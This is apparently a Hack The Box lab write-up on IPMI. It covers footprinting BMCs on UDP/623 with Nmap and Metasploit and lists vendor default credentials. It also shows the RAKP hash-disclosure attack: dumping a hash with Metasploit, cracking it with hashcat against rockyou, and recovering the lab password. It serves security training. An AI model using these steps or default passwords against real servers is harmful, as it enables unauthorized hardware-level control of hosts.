# IPMI

## Overview

IPMI (Intelligent Platform Management Interface) is a standard for hardware-level server management and monitoring. It operates independently of the host operating system, BIOS, CPU, and firmware. It can be used before OS boot, while the host is powered down (the BMC still needs power and network connectivity), and after a system failure.

### BMC

The Baseboard Management Controller (BMC) is the key hardware component implementing IPMI. It can provide remote power control, reboot, hardware monitoring, event logs, and remote management. Access to a BMC is high impact because it can provide control over the host at a level close to physical access.

Common BMC products:
- HP iLO
- Dell DRAC / iDRAC
- Supermicro IPMI

## Footprinting

IPMI commonly communicates over UDP/623.

### Nmap version detection

```bash
sudo nmap -sU --script ipmi-version -p 623 <TARGET_IP>
```

- `-sU`: UDP scan.
- `--script ipmi-version`: run the Nmap NSE script that fingerprints IPMI.
- `-p 623`: scan UDP port 623.

**Lab observation:** Target `10.129.40.33` responded with `623/udp open asf-rmcp` and reported `IPMI-2.0`, along with authentication capabilities and supported IPMI levels.

**Important distinction:** `IPMI-2.0` is the protocol version. Values in the `Level` field are supported IPMI privilege levels; they do not prove that our current account has those privileges. An advertised capability is not proof of authenticated access.

### Metasploit version scan

```text
msfconsole
use auxiliary/scanner/ipmi/ipmi_version
set rhosts <TARGET_IP>
show options
run
```

Metasploit confirmed the same IPMI version and authentication information as Nmap.

## Default credentials

HTB lists these common defaults to check during an authorized assessment:

| Product | Username | Password |
|---|---|---|
| Dell iDRAC | `root` | `calvin` |
| HP iLO | `Administrator` | Randomized 8-character string (uppercase letters and digits) |
| Supermicro IPMI | `ADMIN` | `ADMIN` |

These are examples, not proof that a particular target uses them.

## Dangerous Settings — IPMI 2.0 RAKP

During the IPMI 2.0 RAKP authentication exchange, the BMC can disclose password-derived authentication data before authentication completes. An attacker may capture this data for a valid username and attempt offline password cracking.

High-level workflow:
1. Request authentication using a known or discovered username.
2. Retrieve the RAKP authentication hash material.
3. Save the hash in the format expected by the cracking tool.
4. Attempt offline password recovery.

Offline cracking tests candidates locally against the captured hash. It does not repeatedly send password guesses to the BMC.

### Metasploit hash retrieval

```text
use auxiliary/scanner/ipmi/ipmi_dumphashes
set rhosts <TARGET_IP>
show options
run
```

The module returned a hash for the account `admin` in this lab.

### Hashcat

```bash
hashcat -m 7300 <HASH_FILE> <WORDLIST>
```

- `-m 7300`: IPMI2 RAKP HMAC-SHA1.
- `<HASH_FILE>`: file containing the captured hash in the expected format.
- `<WORDLIST>`: candidate passwords.

Useful indicators:
- `Recovered: 0/1`: the candidates tried did not crack the hash.
- `Recovered: 1/1` and `Status: Cracked`: successful recovery.
- `hashcat -m 7300 <HASH_FILE> --show`: display previously recovered plaintext.

## Hands-on lab notes

Target: `10.129.40.33`

1. Nmap IPMI version scan found UDP/623 open and identified IPMI 2.0.
2. Metasploit `auxiliary/scanner/ipmi/ipmi_version` confirmed the service details.
3. Metasploit `auxiliary/scanner/ipmi/ipmi_dumphashes` retrieved an authentication hash for `admin`.
4. The hash was saved to `ipmi.txt` in Hashcat-compatible format.
5. The Metasploit wordlist at `/usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt` was tested first. Hashcat ended with `Status: Exhausted` and `Recovered: 0/1`; it did **not** crack the password.
6. The compressed RockYou wordlist was available at `/usr/share/wordlists/rockyou.txt.gz` and decompressed with:
   ```bash
   sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
   ```
7. Hashcat was run with RockYou:
   ```bash
   hashcat -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt
   ```
   It returned `Status: Cracked` and `Recovered: 1/1`.
8. The recovered value was verified with:
   ```bash
   hashcat -m 7300 ipmi.txt --show
   ```
   The plaintext password was `trinity`.

**Lab credentials:**
- Username: `admin`
- Cleartext password: `trinity`

**Troubleshooting lesson:** The Hashcat `Candidates` line does not prove a password was recovered. The first wordlist failed; success was established only by `Recovered: 1/1` and the `--show` output.

## Practical takeaways

- Check UDP/623 when enumerating internal networks for IPMI.
- Distinguish protocol version and advertised capabilities from authenticated access and actual user privileges.
- BMC access is high impact because it enables remote hardware-level management.
- IPMI 2.0 RAKP may expose password-derived data that can be attacked offline.
- Verify cracking success using Hashcat's recovered status and `--show`.

## Scope of completed lab work

Completed:
- Nmap IPMI version scan.
- Metasploit `ipmi_version` scan.
- Metasploit `ipmi_dumphashes` hash retrieval.
- Offline cracking with Hashcat mode 7300.
- Recovered and submitted the lab username and cleartext password.

Not performed:
- No separate login to the BMC was documented.
- No further BMC actions or exploitation were performed.
